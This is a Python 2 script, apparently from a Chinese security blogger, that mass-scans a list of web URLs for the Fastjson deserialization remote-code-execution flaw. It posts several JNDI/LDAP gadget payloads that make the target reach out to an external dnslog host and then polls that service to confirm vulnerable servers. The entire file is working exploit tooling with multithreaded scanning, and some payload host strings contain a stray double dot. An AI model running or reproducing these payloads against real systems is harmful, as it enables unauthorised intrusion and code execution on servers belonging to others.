#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
code by: Stu.
公众号：安全黑板报
"""
import json
import random
import requests
import time,Queue
import argparse,sys
import threading

vuln_count = 0
payload =['{"type":0,"pageSize":3,"pageNo":1,"a":"%s"}']


payload.append('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s.dnslog.cn/Exploit","autoCommit":"true"}')
payload.append('{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://%s..dnslog.link/Exploit"}}')
payload.append('{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"ldap://%s..dnslog.link/Exploit","autoCommit":"true"}')
payload.append('{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",'+'"dataSourceName":"ldap://%s..dnslog.link/Exploit","autoCommit":"true"}}')



def checkvuln():
    global vuln_count
    while True:
        try:
            web_url = queue.get(timeout=0.1)
        except:
            break
        try:
            for x in range(len(payload)):
                random_str_ = random_str(8)
                data = payload[x] % random_str_
                res = requests.post(url=web_url,data=data,timeout=1.5)
                result = getdnslog(random_str_)
                if result == "True":
                    print "[+200] vuln fastjson rce",web_url,"\n  payload:",data
                    vuln_count+=1
                    break
                else:
                    pass
        except Exception,e:
            result = getdnslog(random_str_)
            if result == "True":
                print "[+200] vuln fastjson rce",web_url,"\n  payload:",data
                vuln_count+=1
                break
            else:
                pass

#查看dnslog状态
def getdnslog(random_str):
    dns_check = "https://admin.dnslog.link/api/dns//%s/" % random_str#token 替换为http://admin.dnslog.link平台字符串
    res = requests.get(dns_check)
    return res.text.strip()

#取得随机数
def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return str(str1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                    description="Fastjson Rce.By Stu.",
                                    usage="scan.py [optional]")
    parser.add_argument("-f",metavar="File",type=str,default="url.txt",help="Put Web url in url.txt")
    parser.add_argument("-u",metavar="Url",type=str,help="Put a Web url")
    parser.add_argument("-t",metavar="THREADS",type=int,default="10",help="Num of scan threads,default 10")

    if len(sys.argv)==1:
        sys.argv.append("-h")
    args = parser.parse_args()
    start_time = time.time()
    if args.u is None:
    #将url放入队列
        queue = Queue.Queue()
        for web_url in open(args.f).xreadlines():
            web_url = web_url.strip() 
            if web_url.find("http") >= 0:
                pass
            else:
                web_url = "http://"+web_url
            if not web_url:
                continue
            queue.put(web_url)

        #开启多线程访问
        threads = []
        for i in range(args.t):
            t = threading.Thread(target=checkvuln)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    else:
        queue = Queue.Queue()
        web_url = (args.u).strip()
        if web_url.find("http") >= 0:
            pass
        else:
            web_url = "http://"+web_url
        queue.put(web_url)
        checkvuln()
    print ("[+]Done. scanned %s available %.1f seconds." % (vuln_count,time.time() - start_time))

